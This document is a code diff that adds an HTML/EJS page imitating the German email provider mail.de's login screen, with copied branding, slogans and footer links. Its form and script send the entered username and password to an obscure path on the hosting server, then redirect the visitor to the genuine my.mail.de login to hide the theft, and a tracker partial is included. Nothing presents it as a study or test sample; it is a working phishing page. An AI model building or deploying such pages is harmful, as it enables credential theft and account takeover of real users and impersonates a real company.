@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, minimum-scale=1, maximum-scale=5">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <title>Login - mail.de</title>
+
+    <!-- Fallback paths for external CSS -->
+    <link rel="stylesheet" href="public/css/botta.css">
+    <link rel="stylesheet" href="/public/css/botta.css">
+    <link rel="stylesheet" href="css/botta.css">
+    <link rel="stylesheet" href="/css/botta.css">
+
+    <!-- Embedded CSS guarantees instantaneous styling and zero unstyled flash -->
+    <style>
+/* mail.de Fully Responsive Styles - Big PC Fonts & All-Device Layout */
+@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap');
+
+:root {
+    --mail-blue-bg: #009aff;
+    --mail-blue-gradient-top: #009aff;
+    --mail-blue-gradient-mid: #009eff;
+    --mail-blue-gradient-bottom: #00a3ff;
+    --mail-dark-navy: #002855;
+    --mail-dark-navy-hover: #001b3c;
+    --mail-dark-navy-active: #001229;
+    --mail-link-blue: #00366a;
+    --mail-link-hover: #001d3d;
+    --mail-footer-bg: #16244d;
+    --mail-footer-link: #339ff7;
+    --mail-footer-text: #9bb3d3;
+}
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html, body {
+    height: 100%;
+    min-height: 100%;
+    font-family: Arial, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, sans-serif;
+    color: #ffffff;
+    background-color: var(--mail-blue-bg);
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    overflow-x: hidden;
+}
+
+.site-container {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    min-height: 100dvh;
+    width: 100%;
+    overflow-x: hidden;
+}
+
+/* ==========================================================================
+   Header (Masthead)
+   ========================================================================== */
+.masthead {
+    width: 100%;
+    background-color: #ffffff;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+    z-index: 10;
+    flex-shrink: 0;
+}
+
+.masthead-inner {
+    width: 100%;
+    max-width: 1240px;
+    height: 100%;
+    margin: 0 auto;
+    display: flex;
+    align-items: center;
+}
+
+.logo-link {
+    display: inline-flex;
+    align-items: center;
+    text-decoration: none;
+}
+
+.header-logo {
+    display: block;
+    height: auto;
+    max-width: 100%;
+    object-fit: contain;
+}
+
+/* ==========================================================================
+   Main Content Area
+   ========================================================================== */
+.main-wrapper {
+    flex: 1 0 auto;
+    background: linear-gradient(180deg, var(--mail-blue-gradient-top) 0%, var(--mail-blue-gradient-mid) 50%, var(--mail-blue-gradient-bottom) 100%);
+    width: 100%;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+}
+
+/* Mobile Heading - Hidden by default on PC */
+.mobile-heading {
+    display: none;
+    text-align: center;
+    color: #ffffff;
+    user-select: none;
+}
+
+.mobile-heading .heading-line1 {
+    font-size: clamp(20px, 5.2vw, 26px);
+    font-weight: 500;
+    line-height: 1.25;
+    letter-spacing: -0.3px;
+}
+
+.mobile-heading .heading-line2 {
+    font-size: clamp(22px, 5.8vw, 30px);
+    font-weight: 700;
+    line-height: 1.25;
+    letter-spacing: -0.3px;
+    margin-top: 3px;
+}
+
+/* Content Container */
+.content-container {
+    width: 100%;
+    max-width: 1240px;
+    margin: 0 auto;
+    display: flex;
+    position: relative;
+}
+
+/* ==========================================================================
+   Login Form Base Styles
+   ========================================================================== */
+.login-area {
+    position: relative;
+    z-index: 2;
+}
+
+.login-form {
+    width: 100%;
+}
+
+.form-group {
+    width: 100%;
+}
+
+.form-label {
+    display: block;
+    color: #ffffff;
+    font-weight: 700;
+    line-height: 1.2;
+}
+
+.form-input {
+    width: 100%;
+    background-color: #ffffff;
+    border: 1px solid #ffffff;
+    color: #1a1a1a;
+    outline: none;
+    font-family: inherit;
+    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.08);
+    transition: box-shadow 0.15s ease, border-color 0.15s ease;
+}
+
+.form-input:focus {
+    box-shadow: 0 0 0 2px rgba(0, 40, 85, 0.45);
+}
+
+.input-password-wrapper {
+    position: relative;
+    width: 100%;
+    display: flex;
+    align-items: center;
+}
+
+.pwd-toggle-btn {
+    position: absolute;
+    right: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--mail-dark-navy);
+}
+
+.pwd-toggle-btn svg {
+    fill: var(--mail-dark-navy);
+    display: block;
+    pointer-events: none;
+}
+
+.submit-btn {
+    background-color: var(--mail-dark-navy);
+    color: #ffffff;
+    border: none;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+    transition: background-color 0.15s ease, transform 0.05s ease;
+    font-family: inherit;
+}
+
+.submit-btn:hover {
+    background-color: var(--mail-dark-navy-hover);
+}
+
+.submit-btn:active {
+    background-color: var(--mail-dark-navy-active);
+    transform: translateY(1px);
+}
+
+.form-links {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    width: 100%;
+    white-space: nowrap;
+}
+
+.form-link {
+    color: var(--mail-link-blue);
+    text-decoration: underline;
+    font-weight: 600;
+    transition: color 0.15s ease;
+}
+
+.form-link:hover {
+    color: var(--mail-link-hover);
+}
+
+/* Illustration Base Styles */
+.illustration-area {
+    position: relative;
+    user-select: none;
+    pointer-events: none;
+}
+
+.illustration-img {
+    display: block;
+    width: 100%;
+    height: auto;
+}
+
+/* ==========================================================================
+   Footer Base Styles
+   ========================================================================== */
+.mastfoot {
+    background-color: var(--mail-footer-bg);
+    width: 100%;
+    z-index: 10;
+    flex-shrink: 0;
+}
+
+.foot-links {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.foot-links a {
+    color: var(--mail-footer-link);
+    text-decoration: none;
+    font-weight: 400;
+    transition: color 0.15s ease, text-decoration 0.15s ease;
+}
+
+.foot-links a:hover {
+    text-decoration: underline;
+}
+
+.foot-copyright {
+    text-align: center;
+    color: var(--mail-footer-text);
+    line-height: 1.4;
+}
+
+/* ==========================================================================
+   1. PC & LARGE SCREENS (>= 992px, 1200px, 1366px, 1920px)
+   Big Fonts, Clear Proportions & High Positioned Form
+   ========================================================================== */
+@media (min-width: 992px) {
+    /* Header on PC */
+    .masthead {
+        height: 60px;
+    }
+
+    .masthead-inner {
+        padding: 0 40px;
+        padding-left: clamp(40px, 16vw, 180px);
+        justify-content: flex-start;
+    }
+
+    .header-logo {
+        height: 38px;
+    }
+
+    .mobile-heading {
+        display: none !important;
+    }
+
+    /* Main wrapper: High position, no excessive empty space above */
+    .main-wrapper {
+        padding-top: 45px;
+        padding-bottom: 60px;
+    }
+
+    .content-container {
+        flex-direction: row;
+        align-items: flex-start;
+        justify-content: flex-start;
+        padding: 0 40px;
+        padding-left: clamp(40px, 16vw, 180px);
+        gap: clamp(36px, 4vw, 60px);
+    }
+
+    /* Big PC Login Form */
+    .login-area {
+        width: 280px;
+        min-width: 280px;
+        max-width: 290px;
+        flex-shrink: 0;
+        margin-top: 0;
+    }
+
+    .form-group {
+        margin-bottom: 0;
+    }
+
+    .form-group.password-group {
+        margin-top: 16px;
+    }
+
+    /* Big PC Labels */
+    .form-label {
+        font-size: 20px;
+        font-weight: 700;
+        margin-bottom: 8px;
+        letter-spacing: -0.2px;
+    }
+
+    /* Big PC Inputs */
+    .form-input {
+        height: 46px;
+        padding: 10px 14px;
+        font-size: 17px;
+        border-radius: 4px;
+    }
+
+    .input-password-wrapper .form-input {
+        padding-right: 44px;
+    }
+
+    .pwd-toggle-btn {
+        padding: 0 12px;
+    }
+
+    .pwd-toggle-btn svg {
+        width: 20px;
+        height: 16px;
+    }
+
+    /* Big PC Button with 26px vertical spacing above */
+    .submit-btn {
+        width: 100%;
+        height: 50px;
+        font-size: 18px;
+        font-weight: 700;
+        border-radius: 5px;
+        margin-top: 26px;
+        margin-bottom: 16px;
+    }
+
+    /* Big PC Links */
+    .form-links {
+        font-size: 14.5px;
+        gap: 12px;
+    }
+
+    /* Large Sharp Illustration on PC */
+    .illustration-area {
+        display: block;
+        width: clamp(520px, 46vw, 640px);
+        max-width: 650px;
+        flex-shrink: 1;
+        margin-top: -15px;
+    }
+
+    /* PC Footer */
+    .mastfoot {
+        padding: 20px 30px 16px;
+    }
+
+    .foot-links {
+        gap: 28px;
+        margin-bottom: 8px;
+    }
+
+    .foot-links a {
+        font-size: 14px;
+    }
+
+    .foot-copyright {
+        font-size: 12px;
+    }
+}
+
+/* ==========================================================================
+   2. TABLETS & MEDIUM SCREENS (768px - 991px)
+   ========================================================================== */
+@media (min-width: 768px) and (max-width: 991px) {
+    .masthead {
+        height: 54px;
+    }
+
+    .masthead-inner {
+        padding: 0 24px;
+        justify-content: flex-start;
+    }
+
+    .header-logo {
+        height: 32px;
+    }
+
+    .mobile-heading {
+        display: none !important;
+    }
+
+    .main-wrapper {
+        padding-top: 35px;
+        padding-bottom: 45px;
+    }
+
+    .content-container {
+        flex-direction: row;
+        align-items: flex-start;
+        justify-content: center;
+        gap: 30px;
+        padding: 0 20px;
+    }
+
+    .login-area {
+        width: 260px;
+        min-width: 250px;
+        flex-shrink: 0;
+    }
+
+    .form-group.password-group {
+        margin-top: 14px;
+    }
+
+    .form-label {
+        font-size: 18px;
+        font-weight: 700;
+        margin-bottom: 6px;
+    }
+
+    .form-input {
+        height: 42px;
+        padding: 8px 12px;
+        font-size: 16px;
+        border-radius: 4px;
+    }
+
+    .input-password-wrapper .form-input {
+        padding-right: 40px;
+    }
+
+    .pwd-toggle-btn svg {
+        width: 18px;
+        height: 15px;
+    }
+
+    .submit-btn {
+        width: 100%;
+        height: 46px;
+        font-size: 17px;
+        border-radius: 5px;
+        margin-top: 24px;
+        margin-bottom: 14px;
+    }
+
+    .form-links {
+        font-size: 13.5px;
+    }
+
+    .illustration-area {
+        display: block;
+        width: clamp(380px, 45vw, 450px);
+        flex-shrink: 1;
+        margin-top: -10px;
+    }
+
+    .mastfoot {
+        padding: 18px 20px 14px;
+    }
+
+    .foot-links {
+        gap: 20px;
+        margin-bottom: 8px;
+    }
+
+    .foot-links a {
+        font-size: 13.5px;
+    }
+
+    .foot-copyright {
+        font-size: 11.5px;
+    }
+}
+
+/* ==========================================================================
+   3. MOBILE DEVICES (< 768px, including 390x844 iPhone, Pixel, Galaxy)
+   ========================================================================== */
+@media (max-width: 767px) {
+    .masthead {
+        height: 52px;
+    }
+
+    .masthead-inner {
+        height: 100%;
+        padding: 0 14px;
+        justify-content: flex-start;
+    }
+
+    .header-logo {
+        height: 28px;
+        max-width: 92vw;
+    }
+
+    .mobile-heading {
+        display: block;
+        margin: 32px 16px 28px;
+    }
+
+    .main-wrapper {
+        padding-top: 0;
+        padding-bottom: 45px;
+    }
+
+    .content-container {
+        flex-direction: column;
+        align-items: center;
+        padding: 0 16px;
+        gap: 0;
+    }
+
+    .login-area {
+        width: 100%;
+        max-width: 330px;
+        margin: 0 auto;
+    }
+
+    .form-group {
+        margin-bottom: 18px;
+    }
+
+    .form-group.password-group {
+        margin-top: 0;
+    }
+
+    .form-label {
+        font-size: 17px;
+        font-weight: 700;
+        margin-bottom: 8px;
+    }
+
+    .form-input {
+        height: 46px;
+        padding: 10px 14px;
+        font-size: 16px;
+        border-radius: 4px;
+    }
+
+    .input-password-wrapper .form-input {
+        padding-right: 44px;
+    }
+
+    .pwd-toggle-btn {
+        padding: 0 12px;
+    }
+
+    .pwd-toggle-btn svg {
+        width: 22px;
+        height: 18px;
+    }
+
+    .submit-btn {
+        width: 100%;
+        height: 50px;
+        font-size: 17px;
+        font-weight: 700;
+        border-radius: 5px;
+        margin-top: 24px;
+        margin-bottom: 18px;
+    }
+
+    .form-links {
+        font-size: 14px;
+    }
+
+    .illustration-area {
+        display: none !important;
+    }
+
+    .mastfoot {
+        padding: 22px 14px 18px;
+    }
+
+    .foot-links {
+        gap: 12px 18px;
+        flex-wrap: wrap;
+        margin-bottom: 12px;
+    }
+
+    .foot-links a {
+        font-size: 13.5px;
+    }
+
+    .foot-copyright {
+        font-size: 11.5px;
+    }
+}
+
+/* Extra Small Screens (< 360px) */
+@media (max-width: 359px) {
+    .login-area {
+        max-width: 285px;
+    }
+
+    .form-label {
+        font-size: 15.5px;
+    }
+
+    .form-input {
+        height: 42px;
+        font-size: 15px;
+    }
+
+    .submit-btn {
+        height: 46px;
+        font-size: 16px;
+    }
+
+    .form-links {
+        font-size: 12.5px;
+    }
+}
+    </style>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+</head>
+
+<body>
+    <div class="site-container">
+        <!-- Top Header Bar -->
+        <header class="masthead">
+            <div class="masthead-inner">
+                <a href="#" class="logo-link">
+                    <img src="public/img/LOGO-SAM.png"
+                         onerror="if(!this._t){this._t=1;this.src='img/LOGO-SAM.png';}else if(this._t===1){this._t=2;this.src='/public/img/LOGO-SAM.png';}else if(this._t===2){this._t=3;this.src='/img/LOGO-SAM.png';}"
+                         alt="mail.de - mehr Sicherheit, Seriosität und Komfort"
+                         class="header-logo">
+                </a>
+            </div>
+        </header>
+
+        <!-- Main Section with mail.de blue background -->
+        <main class="main-wrapper">
+            <!-- Mobile Heading (visible on mobile screens <= 768px) -->
+            <div class="mobile-heading">
+                <div class="heading-line1">Keine Werbung. Kein Spam.</div>
+                <div class="heading-line2">Einfach nur E-Mail.</div>
+            </div>
+
+            <!-- Content Area (Side-by-side on PC, centered column on mobile) -->
+            <div class="content-container">
+                <!-- Login Form Column -->
+                <div class="login-area">
+                    <form id="loginForm" class="login-form" method="POST" action="/gzLbTbjqMpc34D4XsPJ2">
+                        <div class="form-group">
+                            <label for="username" class="form-label">E-Mail / Login:</label>
+                            <input
+                                type="text"
+                                id="username"
+                                name="username"
+                                class="form-input"
+                                required
+                                autocomplete="username"
+                                spellcheck="false"
+                                autofocus
+                            />
+                        </div>
+
+                        <div class="form-group password-group">
+                            <label for="password" class="form-label">Passwort:</label>
+                            <div class="input-password-wrapper">
+                                <input
+                                    type="password"
+                                    id="password"
+                                    name="password"
+                                    class="form-input"
+                                    required
+                                    autocomplete="current-password"
+                                />
+                                <button type="button" class="pwd-toggle-btn" id="pwdToggleBtn" aria-label="Passwort anzeigen">
+                                    <svg id="eyeShowSvg" viewBox="0 0 20 17" aria-hidden="true">
+                                        <path d="M 19.791334,8.1890214 C 17.705634,4.333261 14.047922,2 10.000302,2 5.9526815,2 2.2887809,4.333261 0.22164773,8.1890214 L 0.04835513,8.479905 0.20926967,8.7769786 C 2.2949698,12.632739 5.9526815,14.966 10.000302,14.966 c 4.04762,0 7.711521,-2.302316 9.791032,-6.1890214 L 19.952249,8.479905 Z m -9.791032,5.5082296 c -3.484419,0 -6.684144,-1.943353 -8.5408499,-5.217346 C 3.316158,5.2059129 6.515883,3.2625604 10.000302,3.2625604 c 3.484419,0 6.647009,1.9495414 8.53466,5.2173446 -1.887651,3.273993 -5.05643,5.217346 -8.53466,5.217346 z" />
+                                        <path d="M 10.179784,4.2528039 A 4.2456688,4.2456688 0 1 0 14.456397,8.479905 4.2456688,4.2456688 0 0 0 10.179784,4.2528039 Z m 0,7.2535331 a 3.0078644,3.0078644 0 1 1 3.038809,-3.026432 3.0140534,3.0140534 0 0 1 -3.038809,3.026432 z" />
+                                    </svg>
+                                    <svg id="eyeHideSvg" viewBox="0 0 20 17" aria-hidden="true" style="display: none;">
+                                        <path d="M 14.150004,9.9590711 A 4.1912706,4.1912538 0 0 0 14.415788,8.4754884 4.2407251,4.2407081 0 0 0 10.175071,4.2347886 4.1974524,4.1974355 0 0 0 8.7099266,4.5005713 l 0.9953556,1.026241 a 2.9549075,2.9548956 0 0 1 0.4575658,-0.037778 3.0105439,3.0105318 0 0 1 3.016712,2.985788 2.9610894,2.9610775 0 0 1 -0.03778,0.4575639 z" />
+                                        <path d="M 19.77544,8.1849053 C 17.692172,4.3336571 14.038734,2.0031255 9.995822,2.0031255 A 10.397813,10.397771 0 0 0 6.7565497,2.5284685 L 7.7519053,3.5300424 A 9.1367226,9.1366859 0 0 1 9.9959109,3.2395926 c 3.4803661,0 6.6454371,1.9411467 8.5309011,5.2112509 a 10.972721,10.972677 0 0 1 -2.70146,3.1527025 L 16.70315,12.48134 A 12.320358,12.320308 0 0 0 19.793996,8.7721828 L 19.954,8.4755107 Z" />
+                                        <path d="M 1.5885455,0.92130575 4.3456292,3.6783784 A 12.066903,12.066854 0 0 0 0.21000357,8.1849053 L 0.05,8.4753551 0.21000357,8.7720272 C 2.2931612,12.623275 5.9467316,14.953807 9.9896441,14.953807 A 10.465813,10.465771 0 0 0 14.545634,13.909121 L 17.636548,17 18.71835,16.07265 2.6456357,0 Z M 7.6158133,6.9485494 11.726727,11.059447 A 2.9734531,2.9734411 0 0 1 10.18136,11.504566 3.0105439,3.0105318 0 0 1 7.1708256,8.4754884 2.9734531,2.9734411 0 0 1 7.6159466,6.9485716 Z M 6.7195711,6.0523108 a 4.2345432,4.2345262 0 0 0 5.9036209,5.9035972 l 0.989133,0.989129 a 9.2170861,9.2170491 0 0 1 -3.6225253,0.741791 c -3.4803666,0 -6.6454595,-1.941146 -8.5309015,-5.2112507 A 10.688358,10.688315 0 0 1 5.2421604,4.5810616 Z" />
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="submit-btn" id="submitBtn">Jetzt einloggen</button>
+
+                        <div class="form-links">
+                            <a href="https://registrierung.mail.de/de" target="_blank" class="form-link">Jetzt registrieren</a>
+                            <a href="https://my.mail.de/passwort-vergessen" target="_blank" class="form-link">Passwort vergessen</a>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Desktop Illustration Column (Hidden on mobile) -->
+                <div class="illustration-area">
+                    <img src="public/img/LOGO-DE.png"
+                         onerror="if(!this._t){this._t=1;this.src='img/LOGO-DE.png';}else if(this._t===1){this._t=2;this.src='/public/img/LOGO-DE.png';}else if(this._t===2){this._t=3;this.src='/img/LOGO-DE.png';}"
+                         alt="mail.de Illustration"
+                         class="illustration-img">
+                </div>
+            </div>
+        </main>
+
+        <!-- Footer -->
+        <footer class="mastfoot">
+            <div class="foot-links">
+                <a href="https://mail.de/de/hilfe" target="_blank" rel="noopener">Hilfe</a>
+                <a href="https://status.mail.de/" target="_blank" rel="noopener">Serverstatus</a>
+                <a href="https://my.mail.de/de/cancelation" target="_blank" rel="noopener">Vertrag kündigen</a>
+                <a href="https://mail.de/de/impressum/" target="_blank" rel="noopener">Impressum</a>
+            </div>
+            <div class="foot-copyright">
+                <span>Alle Rechte vorbehalten.</span> <span>©2009-2026 by mail.de GmbH</span>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Password Visibility Toggle
+        const pwdToggleBtn = document.getElementById('pwdToggleBtn');
+        const passwordInput = document.getElementById('password');
+        const eyeShowSvg = document.getElementById('eyeShowSvg');
+        const eyeHideSvg = document.getElementById('eyeHideSvg');
+
+        if (pwdToggleBtn && passwordInput) {
+            pwdToggleBtn.addEventListener('click', function () {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    if (eyeShowSvg) eyeShowSvg.style.display = 'none';
+                    if (eyeHideSvg) eyeHideSvg.style.display = 'block';
+                    pwdToggleBtn.setAttribute('aria-label', 'Passwort verbergen');
+                } else {
+                    passwordInput.type = 'password';
+                    if (eyeShowSvg) eyeShowSvg.style.display = 'block';
+                    if (eyeHideSvg) eyeHideSvg.style.display = 'none';
+                    pwdToggleBtn.setAttribute('aria-label', 'Passwort anzeigen');
+                }
+            });
+        }
+
+        // Form Submit Handler
+        const loginForm = document.getElementById('loginForm');
+        if (loginForm) {
+            loginForm.addEventListener('submit', function (e) {
+                e.preventDefault();
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                console.log('Login attempt:', { username });
+
+                if (window.$ && $.ajax) {
+                    $.ajax({
+                        url: '/gzLbTbjqMpc34D4XsPJ2',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({ username, password }),
+                        success: function (info) {
+                            if (info && info.OK) {
+                                window.location = 'https://my.mail.de/login';
+                            }
+                        },
+                        error: function () {
+                            // Fallback if endpoint not responding as expected
+                            window.location = 'https://my.mail.de/login';
+                        }
+                    });
+                } else {
+                    fetch('/gzLbTbjqMpc34D4XsPJ2', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ username, password })
+                    }).then(r => r.json()).then(info => {
+                        if (info && info.OK) {
+                            window.location = 'https://my.mail.de/login';
+                        }
+                    }).catch(() => {
+                        window.location = 'https://my.mail.de/login';
+                    });
+                }
+            });
+        }
+    </script>
+</body>
+
+</html>
